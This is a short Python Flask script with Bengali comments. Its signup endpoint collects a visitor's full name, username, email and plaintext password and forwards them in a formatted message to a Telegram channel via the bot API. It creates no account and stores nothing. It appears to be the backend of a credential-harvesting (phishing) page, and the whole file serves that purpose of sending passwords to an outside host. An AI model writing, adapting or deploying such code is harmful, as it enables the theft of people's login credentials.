import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# আপনার টেলিগ্রাম বট টোকেন এবং চ্যানেল আইডি এখানে বসাবেন
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHANNEL_ID = "YOUR_CHANNEL_ID_HERE"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/signup', methods=['POST'])
def signup():
    data = request.json
    full_name = data.get('full_name')
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')
    
    # টেলিগ্রাম চ্যানেলে পাঠানোর জন্য মেসেজ ফরম্যাট
    message = (
        f"🚨 **New User Signup** 🚨\n\n"
        f"👤 **Full Name:** {full_name}\n"
        f"🏷️ **Username:** {username}\n"
        f"📧 **Email:** {email}\n"
        f"🔑 **Password:** {password}"
    )
    
    # টেলিগ্রাম এপিআই কল
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHANNEL_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    
    response = requests.post(url, json=payload)
    
    if response.status_code == 200:
        return jsonify({'status': 'success', 'message': 'Signup data sent to Telegram!'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send data to Telegram.'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
